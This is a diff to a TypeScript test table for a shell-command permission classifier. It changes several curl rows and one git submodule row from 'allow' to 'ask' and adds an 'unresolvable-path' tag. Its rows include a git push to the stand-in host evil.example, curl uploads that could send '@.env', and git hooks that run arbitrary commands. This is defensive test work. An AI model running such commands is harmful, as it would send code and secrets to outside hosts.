@@ -52,10 +52,10 @@ const rows: Row[] = [
   ['git remote set-url $N https://evil.example/r.git; git push origin main', 'ask', 'ask', 'allow', ['upload']],
   // `$F` may also be `--pathspec-from-file=<file>`, and git prints the lines of that file in its error
   ['git add -f $F', 'ask', 'ask', 'ask', ['secret-into-plain-file', 'unresolvable-path']],
-  // a curl body, form or header from a variable may be `@.env`, and a subcommand may be `publish`
-  ['curl --data-urlencode $X https://x.example', 'ask', 'ask', 'allow', ['upload']],
-  ['curl -F "$FORM" https://x.example', 'ask', 'ask', 'allow', ['upload']],
-  ['curl -H "$HDR" https://x.example', 'ask', 'ask', 'allow', ['upload']],
+  // a curl body, form or header from a variable may be `@.env`, which names a file the analysis cannot place, and a subcommand may be `publish`
+  ['curl --data-urlencode $X https://x.example', 'ask', 'ask', 'ask', ['upload', 'unresolvable-path']],
+  ['curl -F "$FORM" https://x.example', 'ask', 'ask', 'ask', ['upload', 'unresolvable-path']],
+  ['curl -H "$HDR" https://x.example', 'ask', 'ask', 'ask', ['upload', 'unresolvable-path']],
   ['npm $CMD', 'ask', 'ask', 'allow', ['upload']],
   // arithmetic with no name in it reads nothing, so it runs no code
   ['echo $((1+2))', 'ask', 'allow', 'allow', []],
@@ -97,9 +97,9 @@ const rows: Row[] = [
   ["git difftool -x 'touch x' HEAD", 'ask', 'ask', 'allow', ['shell-dynamic']],
   ["git difftool --extcmd='touch x' HEAD", 'ask', 'ask', 'allow', ['shell-dynamic']],
   ['git bisect run touch x', 'ask', 'ask', 'allow', ['shell-dynamic']],
-  // the action word from a variable (`$_` after `echo run`) can be `run` or `foreach`
+  // the action word from a variable (`$_` after `echo run`) can be `run` or `foreach`, and `$_` may also be submodule's `--reference <dir>`
   ['echo run >/dev/null; git bisect $_ touch x', 'ask', 'ask', 'allow', ['shell-dynamic']],
-  ["echo foreach >/dev/null; git submodule $_ 'touch x'", 'ask', 'ask', 'allow', ['shell-dynamic']],
+  ["echo foreach >/dev/null; git submodule $_ 'touch x'", 'ask', 'ask', 'ask', ['shell-dynamic', 'unresolvable-path']],
   ["git submodule --quiet foreach 'touch x'", 'ask', 'ask', 'allow', ['shell-dynamic']],
   ["git filter-branch --tree-filter 'touch x' HEAD", 'ask', 'ask', 'allow', ['shell-dynamic']],
   ["git send-email --to-cmd='touch x' x.patch", 'ask', 'ask', 'allow', ['shell-dynamic', 'upload']],
